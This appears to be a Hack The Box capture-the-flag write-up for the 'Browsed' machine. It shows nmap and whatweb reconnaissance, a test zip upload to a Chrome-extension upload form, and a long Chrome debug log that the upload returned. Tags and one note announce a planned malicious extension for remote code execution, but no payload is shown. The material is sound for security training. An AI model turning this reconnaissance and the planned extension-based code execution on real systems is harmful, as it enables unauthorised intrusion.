---
title: Browsed
date: 2026-06-01
ShowToc: true
draft: false
TocOpen: true
tags:
  - blog
  - HTB
  - OWASP-Fileupload-Linux-zip-chrome-extension
  - logs-discover
  - Source-Code-Review-Python-Chrome-extension-Upload
  - Source-Code-Review-bash-logic-compare
  - OWASP-OS-Command-Injection
  - Reverser-Shell-base64-javascript
  - CMS-unauthenticated-Gitea-enum
  - Linux-Enumation-who-in-the-box
  - Linux-Privilege-sudo-l
  - Linux-Privilege-python-Library-Hijacking
  - Linux
  - medium
lastmod: 2026-06-11T05:03:40.780Z
---
# Box Info

{{< htb-info "https://www.hackthebox.com/machines/Browsed" >}}

***

# Recon

### PORT & IP SCAN

```
┌─[✗]─[tester@parrot]─[~/Desktop/HTB]
└──╼ $sudo nmap  -p-  -vv -reason -T 5  -o openPort.txt 10.129.244.79 --min-rate=1000
Warning: The -o option is deprecated. Please use -oN
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-01 13:22 HKT
Initiating Ping Scan at 13:22
Scanning 10.129.244.79 [4 ports]
Completed Ping Scan at 13:22, 0.22s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 13:22
Completed Parallel DNS resolution of 1 host. at 13:22, 0.23s elapsed
Initiating SYN Stealth Scan at 13:22
Scanning 10.129.244.79 [65535 ports]
Discovered open port 80/tcp on 10.129.244.79
Discovered open port 22/tcp on 10.129.244.79
Warning: 10.129.244.79 giving up on port because retransmission cap hit (2).
Increasing send delay for 10.129.244.79 from 0 to 5 due to 295 out of 737 dropped probes since last increase.
SYN Stealth Scan Timing: About 40.88% done; ETC: 13:23 (0:00:45 remaining)
Completed SYN Stealth Scan at 13:23, 76.19s elapsed (65535 total ports)
Nmap scan report for 10.129.244.79
Host is up, received echo-reply ttl 63 (0.43s latency).
Scanned at 2026-06-01 13:22:40 HKT for 76s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 76.78 seconds
           Raw packets sent: 75416 (3.318MB) | Rcvd: 75401 (3.016MB)

```

```
┌─[tester@parrot]─[~/Desktop/HTB]
└──╼ $sudo nmap -sC -sV -p $(grep -Eo '^[0-9]+/tcp' openPort.txt | cut -d/ -f1 | paste -sd, -) -T4 10.129.244.79  -oN serviceScan.txt
[sudo] password for tester: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-01 13:30 HKT
Nmap scan report for 10.129.244.79
Host is up (0.24s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 02:c8:a4:ba:c5:ed:0b:13:ef:b7:e7:d7:ef:a2:9d:92 (ECDSA)
|_  256 53:ea:be:c7:07:05:9d:aa:9f:44:f8:bf:32:ed:5c:9a (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Browsed
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.82 seconds
┌─[tester@parrot]─[~/Desktop/HTB]

```

# Shell as larry

### Web 80

### Tech stack

```
┌─[tester@parrot]─[~/Desktop/HTB]
└──╼ $whatweb http://10.129.244.79/ 
http://10.129.244.79/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], IP[10.129.244.79], JQuery, Script, Title[Browsed], nginx[1.24.0]
```

{{< toggle "Tag 🏷️" >}}

{{< tag "OWASP-Fileupload-Linux-zip-chrome-extension" >}} The upload function require to upload the chorme extension as zip , if I normally upload the zip will return the the error message on php to find the extract domain , so I will create the manifest.json and the javascript to do the rce

{{< /toggle >}}

“Upload Extension” goes to `/upload.php`, which presents a form to upload Chrome extensions:

***

### Error message

```
┌─[tester@parrot]─[~/Desktop/HTB/Browsed]
└──╼ $touch test 
┌─[✗]─[tester@parrot]─[~/Desktop/HTB/Browsed]
└──╼ $zip -r test.zip test 
  adding: test (stored 0%)
┌─[tester@parrot]─[~/Desktop/HTB/Browsed]
└──╼ $ls
.  ..  test  test.zip

```

![Pasted image 20260601133757.png](/ob/Pasted%20image%2020260601133757.png)

![Pasted image 20260601133830.png](/ob/Pasted%20image%2020260601133830.png)

```
[2180:2180:0601/053750.567954:VERBOSE1:chrome_crash_reporter_client.cc(182)] GetCollectStatsConsent(): is_official_chrome_build is false so returning false
[2180:2180:0601/053750.649375:VERBOSE1:chrome_crash_reporter_client.cc(182)] GetCollectStatsConsent(): is_official_chrome_build is false so returning false
[2188:2188:0601/053750.753794:VERBOSE1:cdm_registration.cc(234)] Choosing hinted Widevine 4.10.2891.0 from /opt/chrome-linux64/WidevineCdm/_platform_specific/linux_x64/libwidevinecdm.so
[2187:2187:0601/053750.753779:VERBOSE1:cdm_registration.cc(234)] Choosing hinted Widevine 4.10.2891.0 from /opt/chrome-linux64/WidevineCdm/_platform_specific/linux_x64/libwidevinecdm.so
[2188:2188:0601/053750.780881:INFO:cpu_info.cc(53)] Available number of cores: 2
[2187:2187:0601/053750.780886:INFO:cpu_info.cc(53)] Available number of cores: 2
[2188:2188:0601/053750.785191:VERBOSE1:zygote_main_linux.cc(201)] ZygoteMain: initializing 0 fork delegates
[2187:2187:0601/053750.785181:VERBOSE1:zygote_main_linux.cc(201)] ZygoteMain: initializing 0 fork delegates
[2180:2180:0601/053750.850324:VERBOSE1:config_dir_policy_loader.cc(121)] Skipping mandatory platform policies because no policy file was found at: /etc/opt/chrome_for_testing/policies/managed
[2180:2180:0601/053750.850378:VERBOSE1:config_dir_policy_loader.cc(121)] Skipping recommended platform policies because no policy file was found at: /etc/opt/chrome_for_testing/policies/recommended
[2180:2180:0601/053750.893869:VERBOSE1:variations_field_trial_creator_base.cc(539)] Applying FieldTrialTestingConfig
[2180:2180:0601/053750.903295:VERBOSE1:variations_field_trial_creator_base.cc(357)] VariationsSetupComplete
[2180:2180:0601/053750.911263:WARNING:display_server_utils.cc(100)] This is not a Wayland session. Falling back to X11. If you need to run Chrome on Wayland using some embedded compositor, e.g. Weston, please specify Wayland as your preferred Ozone platform, or use --ozone-platform=wayland.
[2180:2195:0601/053750.936913:VERBOSE1:bus.cc(917)] Method call: message_type: MESSAGE_METHOD_CALL
interface: org.freedesktop.DBus
member: GetNameOwner
signature: s

string "org.freedesktop.login1"

[2180:2198:0601/053750.958708:VERBOSE1:bus.cc(917)] Method call: message_type: MESSAGE_METHOD_CALL
interface: org.freedesktop.DBus
member: GetNameOwner
signature: s

string "org.chromium.bluetooth.Manager"

[2180:2180:0601/053750.968363:VERBOSE1:webrtc_event_log_manager.cc(96)] WebRTC remote-bound event logging enabled.
[2180:2180:0601/053750.975408:VERBOSE1:pref_proxy_config_tracker_impl.cc(199)] 0x15a4000d02c0: set chrome proxy config service to 0x15a4000f09c0
[2180:2180:0601/053751.016190:VERBOSE1:device_event_log_impl.cc(204)] [05:37:50.990] Display: EVENT: x11_display_manager.cc:110 Displays updated, count: 1
[2180:2180:0601/053751.016298:VERBOSE1:device_event_log_impl.cc(204)] [05:37:51.016] Display: EVENT: x11_display_manager.cc:112 Display[60] bounds=[0,0 1280x1024], workarea=[0,0 1280x1024], scale=1, rotation=0, panel_rotation=0 external detected
[2180:2180:0601/053751.021752:VERBOSE1:cdm_registration.cc(234)] Choosing hinted Widevine 4.10.2891.0 from /opt/chrome-linux64/WidevineCdm/_platform_specific/linux_x64/libwidevinecdm.so
[2180:2195:0601/053751.025178:ERROR:bus.cc(408)] Failed to connect to the bus: Could not parse server address: Unknown address type (examples of valid types are "tcp" and on UNIX "unix")
[2180:2195:0601/053751.025217:ERROR:bus.cc(408)] Failed to connect to the bus: Could not parse server address: Unknown address type (examples of valid types are "tcp" and on UNIX "unix")
[2180:2195:0601/053751.027192:ERROR:bus.cc(408)] Failed to connect to the bus: Could not parse server address: Unknown address type (examples of valid types are "tcp" and on UNIX "unix")
[2180:2195:0601/053751.027212:ERROR:bus.cc(408)] Failed to connect to the bus: Could not parse server address: Unknown address type (examples of valid types are "tcp" and on UNIX "unix")
[2180:2196:0601/053751.054071:VERBOSE1:media_stream_manager.cc(1501)] MSM::InitializeMaybeAsync([this=0x15a400130f00])
[2180:2196:0601/053751.054172:VERBOSE1:media_stream_manager.cc(1501)] MDM::MediaDevicesManager()
[2180:2196:0601/053751.055299:VERBOSE1:media_stream_manager.cc(1501)] MSM::MediaStreamManager([this=0x15a400130f00]))
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
[2180:2191:0601/053751.492743:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.config/google-chrome-for-testing/Consent To Send Stats": No such file or directory (2)
[2180:2180:0601/053751.504018:VERBOSE1:key_storage_util_linux.cc(46)] Password storage detected desktop environment: (unknown)
[2180:2180:0601/053751.504050:VERBOSE1:key_storage_linux.cc(116)] Selected backend for OSCrypt: BASIC_TEXT
[2180:2180:0601/053751.504068:VERBOSE1:key_storage_linux.cc(135)] OSCrypt did not initialize a backend.
[2180:2195:0601/053751.504672:ERROR:bus.cc(408)] Failed to connect to the bus: Could not parse server address: Unknown address type (examples of valid types are "tcp" and on UNIX "unix")
[2180:2180:0601/053751.506763:VERBOSE1:chrome_browser_cloud_management_controller.cc(161)] Cloud management controller initialization aborted as CBCM is not enabled. Please use the `--enable-chrome-browser-cloud-management` command line flag to enable it if you are not using the official Google Chrome build.
[2180:2192:0601/053751.568763:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.config/google-chrome-for-testing/Default/Web Applications/Logs/WebAppInstallManager.log": No such file or directory (2)
[2180:2195:0601/053751.570747:ERROR:bus.cc(408)] Failed to connect to the bus: Could not parse server address: Unknown address type (examples of valid types are "tcp" and on UNIX "unix")
[2180:2180:0601/053751.572525:VERBOSE1:pref_proxy_config_tracker_impl.cc(199)] 0x15a4000d0b00: set chrome proxy config service to 0x15a4000f3c20
[2180:2180:0601/053751.573887:VERBOSE1:mutable_profile_oauth2_token_service_delegate.cc(310)] MutablePO2TS::MutablePO2TS
[2180:2201:0601/053751.579774:ERROR:simple_backend_impl.cc(79)] Failed to create directory: /var/www/.cache/google-chrome-for-testing/Default/Code Cache/js
[2180:2193:0601/053751.580423:ERROR:simple_backend_impl.cc(79)] Failed to create directory: /var/www/.cache/google-chrome-for-testing/Default/Code Cache/wasm
[2180:2201:0601/053751.581410:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Code Cache/js/index": No such file or directory (2)
[2180:2201:0601/053751.581449:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Code Cache/js/index-dir": No such file or directory (2)
[2180:2201:0601/053751.581468:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Code Cache/js/the-real-index": No such file or directory (2)
[2180:2201:0601/053751.581673:ERROR:simple_backend_impl.cc(79)] Failed to create directory: /var/www/.cache/google-chrome-for-testing/Default/Code Cache/js
[2180:2201:0601/053751.581710:ERROR:simple_backend_impl.cc(747)] Simple Cache Backend: wrong file structure on disk: 1 path: /var/www/.cache/google-chrome-for-testing/Default/Code Cache/js
[2180:2193:0601/053751.581789:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Code Cache/wasm/index": No such file or directory (2)
[2180:2193:0601/053751.581832:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Code Cache/wasm/index-dir": No such file or directory (2)
[2180:2193:0601/053751.581851:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Code Cache/wasm/the-real-index": No such file or directory (2)
[2180:2193:0601/053751.581992:ERROR:simple_backend_impl.cc(79)] Failed to create directory: /var/www/.cache/google-chrome-for-testing/Default/Code Cache/wasm
[2180:2193:0601/053751.582005:ERROR:simple_backend_impl.cc(747)] Simple Cache Backend: wrong file structure on disk: 1 path: /var/www/.cache/google-chrome-for-testing/Default/Code Cache/wasm
[2180:2180:0601/053751.582242:VERBOSE1:pref_proxy_config_tracker_impl.cc(199)] 0x15a4000d2c00: set chrome proxy config service to 0x15a4000f5140
[2180:2180:0601/053751.582489:VERBOSE1:device_event_log_impl.cc(204)] [05:37:51.582] Bluetooth: EVENT: bluetooth_api.cc:82 BluetoothAPI: 0x15a400124e00
[2180:2219:0601/053751.586891:ERROR:disk_cache.cc(216)] Unable to create cache
[2180:2219:0601/053751.586910:ERROR:disk_cache.cc(216)] Unable to create cache
[2180:2180:0601/053751.592811:VERBOSE1:gaia_auth_util.cc(55)] Canonicalized @gmail.com to @gmail.com
[2180:2180:0601/053751.592871:VERBOSE1:gaia_auth_util.cc(55)] Canonicalized @gmail.com to @gmail.com
[2180:2180:0601/053751.603891:VERBOSE1:bluetooth_low_energy_event_router.cc(291)] Initializing BluetoothLowEnergyEventRouter.
[2180:2180:0601/053751.611940:VERBOSE1:gaia_auth_util.cc(55)] Canonicalized @gmail.com to @gmail.com
[2180:2180:0601/053751.611962:VERBOSE1:gaia_auth_util.cc(55)] Canonicalized @gmail.com to @gmail.com
[2180:2180:0601/053751.612019:VERBOSE1:account_reconcilor.cc(181)] AccountReconcilor::AccountReconcilor
[2180:2180:0601/053751.612032:VERBOSE1:account_reconcilor.cc(219)] AccountReconcilor::Initialize
[2180:2180:0601/053751.612060:VERBOSE1:account_reconcilor.cc(273)] AccountReconcilor::RegisterWithContentSettings
[2180:2180:0601/053751.612073:VERBOSE1:account_reconcilor.cc(296)] AccountReconcilor::RegisterWithIdentityManager
[2180:2180:0601/053751.639877:VERBOSE1:cached_result_provider.cc(54)] CachedResultProvider loaded prefs with results from previous session: PredictionResult: timestamp: 13399907498883586 result 0: 0 for segmentation key shopping_user
[2180:2180:0601/053751.656644:VERBOSE1:extension_service.cc(1438)] AddComponentExtension Web Store
[2180:2180:0601/053751.662463:VERBOSE1:extension_service.cc(1438)] AddComponentExtension Chromium PDF Viewer
[2180:2180:0601/053751.666031:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/tmp/extension_6a1d1aadcb3412.63505926/_metadata/verified_contents.json": No such file or directory (2)
[2180:2180:0601/053751.666071:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/tmp/extension_6a1d1aadcb3412.63505926/_metadata/computed_hashes.json": No such file or directory (2)
[2180:2180:0601/053751.666090:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/tmp/extension_6a1d1aadcb3412.63505926/_metadata/generated_indexed_rulesets": No such file or directory (2)
[2180:2180:0601/053751.666123:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/tmp/extension_6a1d1aadcb3412.63505926/_metadata": No such file or directory (2)
[2180:2180:0601/053751.667909:WARNING:load_error_reporter.cc(72)] Extension error: Failed to load extension from: /tmp/extension_6a1d1aadcb3412.63505926. Manifest file is missing or unreadable
[2206:2206:0601/053751.744323:VERBOSE1:va_stubs.cc(663)] dlopen(libva.so.2) failed.
[2206:2206:0601/053751.745059:VERBOSE1:va_stubs.cc(665)] dlerror() says:
libva.so.2: cannot open shared object file: No such file or directory
[2206:2206:0601/053751.747018:VERBOSE1:vaapi_wrapper.cc(1556)] GetHandle(): Either VADisplayStateSingleton::PreSandboxInitialization() hasn't been called or that method failed to find a suitable render node
[2206:2206:0601/053751.748578:WARNING:gpu_memory_buffer_support_x11.cc(49)] dri3 extension not supported.
[2206:2206:0601/053751.753204:WARNING:sandbox_linux.cc(420)] InitializeSandbox() called with multiple threads in process gpu-process.
[2206:2206:0601/053751.755296:WARNING:viz_main_impl.cc(85)] VizNullHypothesis is disabled (not a warning)
[2180:2180:0601/053751.760436:ERROR:object_proxy.cc(576)] Failed to call method: org.freedesktop.DBus.NameHasOwner: object_path= /org/freedesktop/DBus: unknown error type: 
[2180:2180:0601/053751.765001:ERROR:object_proxy.cc(576)] Failed to call method: org.freedesktop.DBus.NameHasOwner: object_path= /org/freedesktop/DBus: unknown error type: 
[2180:2195:0601/053751.765140:ERROR:bus.cc(408)] Failed to connect to the bus: Could not parse server address: Unknown address type (examples of valid types are "tcp" and on UNIX "unix")
[2180:2180:0601/053751.767549:ERROR:object_proxy.cc(576)] Failed to call method: org.freedesktop.DBus.NameHasOwner: object_path= /org/freedesktop/DBus: unknown error type: 
[2209:2213:0601/053751.770998:VERBOSE1:network_delegate.cc(37)] NetworkDelegate::NotifyBeforeURLRequest: http://clients2.google.com/time/1/current?cup2key=8:lRwqXlw25rUTBPSHVmoug4mDW8F1szpAduz7cDrK8U0&cup2hreq=e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
[2180:2180:0601/053751.786105:ERROR:object_proxy.cc(576)] Failed to call method: org.freedesktop.DBus.NameHasOwner: object_path= /org/freedesktop/DBus: unknown error type: 
[2180:2240:0601/053751.786184:VERBOSE1:bus.cc(917)] Method call: message_type: MESSAGE_METHOD_CALL
interface: org.freedesktop.DBus
member: GetNameOwner
signature: s

string "org.freedesktop.UPower"

[2180:2240:0601/053751.786570:VERBOSE1:bus.cc(700)] Filter function already exists: 1 with associated data: 0x15a40088dc00
[2180:2240:0601/053751.786591:VERBOSE1:bus.cc(917)] Method call: message_type: MESSAGE_METHOD_CALL
interface: org.freedesktop.DBus
member: GetNameOwner
signature: s

string "org.freedesktop.UPower"

[2180:2240:0601/053751.793774:VERBOSE1:bus.cc(721)] Requested to remove an unknown filter function: 1 with associated data: 0x15a40088db20
[2180:2240:0601/053751.793795:VERBOSE1:bus.cc(721)] Requested to remove an unknown filter function: 1 with associated data: 0x15a40088da40
[2180:2191:0601/053751.799318:VERBOSE1:token_service_table.cc(202)] Loaded tokens: result = 3 ; number of tokens loaded = 0
[2180:2180:0601/053751.801251:VERBOSE1:partitioned_lock_manager.cc(212)] Acquiring <PartitionedLockId>{id: 0x31, partition: 0} for Start@chrome/browser/web_applications/generated_icon_fix_manager.cc:58
[2180:2180:0601/053751.802158:VERBOSE1:partitioned_lock_manager.cc(194)] All locks acquired for Start@chrome/browser/web_applications/generated_icon_fix_manager.cc:58
[2180:2180:0601/053751.813866:VERBOSE1:mutable_profile_oauth2_token_service_delegate.cc(520)] MutablePO2TS::OnWebDataServiceRequestDone. Result type: 5
[2180:2180:0601/053751.813894:VERBOSE1:mutable_profile_oauth2_token_service_delegate.cc(580)] MutablePO2TS::LoadAllCredentialsIntoMemory; 0 credential(s).
[2180:2180:0601/053751.816599:VERBOSE1:mutable_profile_oauth2_token_service_delegate.cc(401)] MutablePO2TS::RefreshTokenIsAvailable
[2180:2180:0601/053751.816622:VERBOSE1:mutable_profile_oauth2_token_service_delegate.cc(401)] MutablePO2TS::RefreshTokenIsAvailable
[2180:2180:0601/053751.816633:VERBOSE1:mutable_profile_oauth2_token_service_delegate.cc(401)] MutablePO2TS::RefreshTokenIsAvailable
[2180:2180:0601/053751.816641:VERBOSE1:mutable_profile_oauth2_token_service_delegate.cc(401)] MutablePO2TS::RefreshTokenIsAvailable
[2209:2213:0601/053751.816639:VERBOSE1:network_delegate.cc(37)] NetworkDelegate::NotifyBeforeURLRequest: https://accounts.google.com/ListAccounts?gpsia=1&source=ChromiumBrowser&json=standard
[2180:2180:0601/053751.817073:VERBOSE1:mutable_profile_oauth2_token_service_delegate.cc(401)] MutablePO2TS::RefreshTokenIsAvailable
[2180:2180:0601/053751.817097:VERBOSE1:mutable_profile_oauth2_token_service_delegate.cc(401)] MutablePO2TS::RefreshTokenIsAvailable
[2180:2180:0601/053751.817106:VERBOSE1:mutable_profile_oauth2_token_service_delegate.cc(401)] MutablePO2TS::RefreshTokenIsAvailable
[2180:2180:0601/053751.817124:VERBOSE1:account_reconcilor.cc(404)] AccountReconcilor::OnEndBatchOfRefreshTokenStateChanges. Reconcilor state: 1
[2180:2180:0601/053751.818851:VERBOSE1:partitioned_lock_manager.cc(236)] Releasing <PartitionedLockId>{id: 0x31, partition: 0} requested by Start@chrome/browser/web_applications/generated_icon_fix_manager.cc:58
[2180:2180:0601/053751.822179:VERBOSE1:signal_filter_processor.cc(61)] Segmentation platform started observing Session.TotalDuration
[2180:2180:0601/053751.822197:VERBOSE1:signal_filter_processor.cc(61)] Segmentation platform started observing Commerce.PriceDrops.ActiveTabNavigationComplete.IsProductDetailPage
[2180:2180:0601/053751.822206:VERBOSE1:signal_filter_processor.cc(54)] Segmentation platform started observing Autofill_PolledCreditCardSuggestions
[2180:2180:0601/053751.822213:VERBOSE1:signal_filter_processor.cc(61)] Segmentation platform started observing IOS.ParcelTracking.Tracked.AutoTrack
[2180:2180:0601/053751.822221:VERBOSE1:signal_filter_processor.cc(61)] Segmentation platform started observing Omnibox.SuggestionUsed.ClientSummarizedResultType
[2180:2180:0601/053751.822229:VERBOSE1:signal_filter_processor.cc(54)] Segmentation platform started observing MetadataWriter
[2180:2180:0601/053751.822237:VERBOSE1:signal_filter_processor.cc(61)] Segmentation platform started observing Sync.DeviceCount2
[2180:2180:0601/053751.822249:VERBOSE1:signal_filter_processor.cc(61)] Segmentation platform started observing Sync.DeviceCount2.Phone
[2180:2180:0601/053751.822260:VERBOSE1:signal_filter_processor.cc(61)] Segmentation platform started observing Sync.DeviceCount2.Desktop
[2180:2180:0601/053751.822270:VERBOSE1:signal_filter_processor.cc(61)] Segmentation platform started observing Sync.DeviceCount2.Tablet
[2180:2180:0601/053751.822278:VERBOSE1:signal_filter_processor.cc(54)] Segmentation platform started observing MobileBookmarkManagerOpen
[2180:2180:0601/053751.822285:VERBOSE1:signal_filter_processor.cc(54)] Segmentation platform started observing NewTabPage.MostVisited.Clicked
[2180:2180:0601/053751.822292:VERBOSE1:signal_filter_processor.cc(54)] Segmentation platform started observing TabGroup.Created.OpenInNewTab
[2180:2180:0601/053751.822299:VERBOSE1:signal_filter_processor.cc(54)] Segmentation platform started observing Android.HistoryPage.OpenItem
[2180:2180:0601/053751.822305:VERBOSE1:signal_filter_processor.cc(54)] Segmentation platform started observing MobileMenuRecentTabs
[2180:2180:0601/053751.822312:VERBOSE1:signal_filter_processor.cc(61)] Segmentation platform started observing PasswordManager.ManagePasswordsReferrer
[2180:2180:0601/053751.822320:VERBOSE1:signal_filter_processor.cc(61)] Segmentation platform started observing PasswordManager.ProfileStore.TotalAccountsHiRes3.WithScheme.Https
[2180:2180:0601/053751.822328:VERBOSE1:signal_filter_processor.cc(61)] Segmentation platform started observing PasswordManager.FillingAssistance
[2180:2180:0601/053751.822339:VERBOSE1:signal_filter_processor.cc(61)] Segmentation platform started observing PasswordManager.SavedPasswordIsGenerated
[2180:2180:0601/053751.822350:VERBOSE1:signal_filter_processor.cc(61)] Segmentation platform started observing PasswordManager.SaveUIDismissalReason
[2180:2180:0601/053751.822360:VERBOSE1:signal_filter_processor.cc(61)] Segmentation platform started observing PasswordManager.SaveUIDismissalReason
[2180:2180:0601/053751.822367:VERBOSE1:signal_filter_processor.cc(61)] Segmentation platform started observing IOS.CredentialExtension.IsEnabled.Startup
[2209:2212:0601/053751.826307:ERROR:simple_backend_impl.cc(79)] Failed to create directory: /var/www/.cache/google-chrome-for-testing/Default/Cache/Cache_Data
[2209:2212:0601/053751.826381:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/Cache_Data/index": No such file or directory (2)
[2209:2212:0601/053751.826420:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/Cache_Data/index-dir": No such file or directory (2)
[2209:2212:0601/053751.826438:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/Cache_Data/the-real-index": No such file or directory (2)
[2209:2212:0601/053751.826896:ERROR:simple_backend_impl.cc(79)] Failed to create directory: /var/www/.cache/google-chrome-for-testing/Default/Cache/Cache_Data
[2209:2212:0601/053751.826930:ERROR:simple_backend_impl.cc(747)] Simple Cache Backend: wrong file structure on disk: 1 path: /var/www/.cache/google-chrome-for-testing/Default/Cache/Cache_Data
[2209:2212:0601/053751.827119:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_000": No such file or directory (2)
[2209:2212:0601/053751.827141:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_001": No such file or directory (2)
[2209:2212:0601/053751.827159:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_002": No such file or directory (2)
[2209:2213:0601/053751.827559:ERROR:disk_cache.cc(216)] Unable to create cache
[2209:2212:0601/053751.827724:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_003": No such file or directory (2)
[2209:2212:0601/053751.827754:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_004": No such file or directory (2)
[2209:2212:0601/053751.828264:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_005": No such file or directory (2)
[2209:2212:0601/053751.828295:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_006": No such file or directory (2)
[2209:2212:0601/053751.828313:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_007": No such file or directory (2)
[2209:2212:0601/053751.828330:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_008": No such file or directory (2)
[2209:2212:0601/053751.828347:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_009": No such file or directory (2)
[2209:2212:0601/053751.828364:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_010": No such file or directory (2)
[2209:2212:0601/053751.828382:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_011": No such file or directory (2)
[2209:2212:0601/053751.828399:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_012": No such file or directory (2)
[2209:2212:0601/053751.828416:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_013": No such file or directory (2)
[2209:2212:0601/053751.828433:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_014": No such file or directory (2)
[2209:2212:0601/053751.828450:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_015": No such file or directory (2)
[2209:2212:0601/053751.828467:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_016": No such file or directory (2)
[2209:2212:0601/053751.828483:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_017": No such file or directory (2)
[2209:2212:0601/053751.828500:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_018": No such file or directory (2)
[2209:2212:0601/053751.828517:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_019": No such file or directory (2)
[2209:2212:0601/053751.828534:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_020": No such file or directory (2)
[2209:2212:0601/053751.828551:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_021": No such file or directory (2)
[2209:2212:0601/053751.828568:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_022": No such file or directory (2)
[2209:2212:0601/053751.828585:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_023": No such file or directory (2)
[2209:2212:0601/053751.828602:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_024": No such file or directory (2)
[2209:2212:0601/053751.828619:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_025": No such file or directory (2)
[2209:2212:0601/053751.828636:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_026": No such file or directory (2)
